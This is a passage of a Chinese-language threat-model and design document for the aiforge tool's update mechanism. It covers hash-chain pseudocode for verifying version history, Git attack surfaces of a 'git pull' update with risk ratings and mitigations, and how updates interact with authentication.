这本质上是一个简化的区块链 / Hash Chain 结构。每个版本记录包含前一个版本记录的哈希值，形成不可篡改的链条。插入、删除、修改任何一个历史条目都会导致后续所有条目的哈希链断裂。

客户端在本地保存最新的链头哈希（head hash），每次与服务端同步时验证链的完整性。

```
伪代码：

STRUCTURE VersionRecord:
  version      : string       // "1.2.0"
  contentHash  : string       // 该版本文件的 Merkle Root
  prevRecordHash: string      // 前一条记录的哈希（链式）
  timestamp    : number
  metadata     : object       // 描述、安全修复标记等
  signature    : string       // 服务端签名

FUNCTION verifyHistoryChain(records, trustedHeadHash):
  // 从最新到最旧遍历
  expectedHash = trustedHeadHash

  FOR EACH record IN records (newest first):
    actualHash = sha256(serialize(record))
    IF actualHash != expectedHash:
      ABORT "历史链在 {record.version} 处断裂"
  
    IF NOT verifySignature(record, TRUSTED_PUBLIC_KEY):
      ABORT "版本 {record.version} 签名无效"
  
    expectedHash = record.prevRecordHash

  // 最后一个（最旧的）记录的 prevRecordHash 应该是创世哈希
  IF expectedHash != GENESIS_HASH:
    ABORT "历史链未到达创世记录"

  RETURN VERIFIED

FUNCTION selectRollbackTarget(records):
  verified = verifyHistoryChain(records, localHeadHash)

  // 只展示经过验证的版本
  safeTargets = records.filter(r => 
    r.version >= securityFloor    // 不低于安全水位线
    AND r.contentHash IS VALID    // 内容可验证
  )

  presentToUser(safeTargets)
```

## 当前 MVP 基线（git pull）的 Git 原生攻击面

当前 MVP 的 update 命令仅执行 `cd <dir> && git pull`，以下是该模型下的 Git 原生安全风险：

```
攻击面 1 — Force-push / 历史重写
──────────────────────────────────
  仓库维护者（或被入侵的账户）执行 git push --force
  → 本地 git pull 后，历史被重写
  → 之前安装的文件版本无法追溯
  → 用户无法判断哪些文件被修改过

  风险等级: 高
  当前防护: 无
  建议: git pull 前记录当前 HEAD commit hash，
        pull 后检测是否发生了 non-fast-forward 更新，
        如果是则输出警告并要求用户确认


攻击面 2 — 未签名 commit/tag
─────────────────────────────
  恶意 commit 被推送到仓库，没有 GPG 签名
  → 无法验证 commit 作者身份
  → 中间人攻击可以注入恶意内容

  风险等级: 中
  当前防护: 无
  建议: P2 阶段支持可选的 commit 签名验证
        （配置项 verifySignatures: true）


攻击面 3 — Git hooks 注入
──────────────────────────
  恶意仓库在 .git/hooks/ 中植入脚本
  → git pull 触发 post-merge hook
  → 自动执行恶意代码

  风险等级: 严重
  当前防护: git clone 默认不执行远程 hooks，
            但本地 .git/hooks/ 可能被手动或工具修改
  建议: 安装后检查 .git/hooks/ 目录，
        如果存在非标准 hook 则输出警告


攻击面 4 — Submodule 风险
──────────────────────────
  知识仓库包含 .gitmodules 引用外部仓库
  → git pull --recurse-submodules 会拉取外部代码
  → 外部仓库可能被入侵

  风险等级: 高
  当前防护: 无（aiforge 不主动处理 submodule）
  建议: 检测 .gitmodules 文件存在时输出警告:
        "⚠️ 该仓库包含 Git submodule，aiforge 不会自动拉取子模块内容"


攻击面 5 — Shallow clone 对回滚/审计的限制
──────────────────────────────────────────
  ADR-010 采用浅克隆（--depth 1）
  → 无法查看历史 commit
  → 无法回滚到之前的版本
  → 无法审计文件变更历史

  风险等级: 中
  当前防护: 浅克隆是有意设计（减少下载量）
  建议: 在 aiforge doctor 中提示浅克隆的限制，
        需要回滚时建议用户执行 git fetch --unshallow


攻击面 6 — Detached HEAD / Branch drift
────────────────────────────────────────
  用户手动在克隆目录中执行 git checkout <commit>
  → HEAD 进入 detached 状态
  → 后续 git pull 失败或行为异常

  或者: 仓库默认分支从 main 改为 develop
  → 本地仍然跟踪旧分支
  → git pull 拉取的不是最新内容

  风险等级: 中
  当前防护: 无
  建议: git pull 前检查 HEAD 状态，
        detached HEAD 时输出警告并建议修复
```

## 攻击向量 #6 总结矩阵

```
┌──────────────────────┬───────────┬─────────────────────────────────────┐
│ 攻击面                │ 风险等级   │ 核心防护                             │
├──────────────────────┼───────────┼─────────────────────────────────────┤
│ 差异伪造             │ 严重      │ 应用后哈希校验 + 签名 manifest       │
│ 版本降级             │ 严重      │ 单调水位线 + CVE 集合不可缩小        │
│ 更新风暴             │ 中        │ 服务端限流 + 客户端版本跳跃          │
│ 差异放大 (diff bomb) │ 高        │ 预估产物大小 + 沙箱配额              │
│ 冲突注入             │ 高        │ 结构化合并 + 安全字段 local-wins    │
│ base 篡改            │ 严重      │ DAG 拓扑确定 LCA + content hash     │
│ TOCTOU 竞态          │ 高        │ OS 文件锁 + 原子写入 + 乐观锁       │
│ 合并策略欺骗         │ 高        │ 安全字段硬编码策略 + 变更审批        │
│ 快照污染             │ 严重      │ Merkle Tree + 签名元数据             │
│ 回滚不完整           │ 严重      │ Copy-on-Write + 原子交换             │
│ 回滚炸弹             │ 高        │ 代码数据联动快照 + 可逆性声明        │
│ 回滚逃逸             │ 严重      │ 沙箱限制 + 审计日志 + 范围外告警     │
│ 历史重写             │ 严重      │ Hash Chain + 本地链头 + 签名         │
└──────────────────────┴───────────┴─────────────────────────────────────┘

一句话总结：
  增量更新 → "信结果不信过程"（哈希校验高于 diff 信任）
  冲突合并 → "结构高于文本，安全高于便利"
  回滚机制 → "回滚 = 前进到一个已验证的旧状态，而非简单的撤销"
```

## 与认证系统的交互点

更新机制与认证系统（攻击向量 #3）存在以下交互场景：

| 交互场景 | 触发条件 | 处理策略 |
|---------|---------|---------|
| Token 过期时执行更新 | `git pull` 返回 401/403 | 触发认证 preflight 重新验证 Token，成功后重试更新 |
| 更新过程中 Token 被撤销 | 长时间更新（大仓库）期间 Token 失效 | 捕获认证错误，提示用户重新认证，保留已下载的部分内容 |
| 多实例 Token 切换 | 更新来源仓库与当前配置的 Token 不匹配 | 根据 remote URL 的 host 自动选择对应的 Token（参见 #3 多实例管理） |
| 符号链接模式下的权限变更 | 仓库权限从 read-write 降级为 read-only | `git pull` 仍可执行，但后续 push 操作需要提示权限不足 |

> 注：更新 preflight（本文）与认证 preflight（#3）是两个独立的检查系统。更新 preflight 在 `aiforge update` 入口触发，验证仓库完整性和签名；认证 preflight 在 `resolveAuth()` 流程中触发，验证 Token 健康和权限。两者可串联执行：先认证 preflight → 再更新 preflight → 执行 `git pull`。
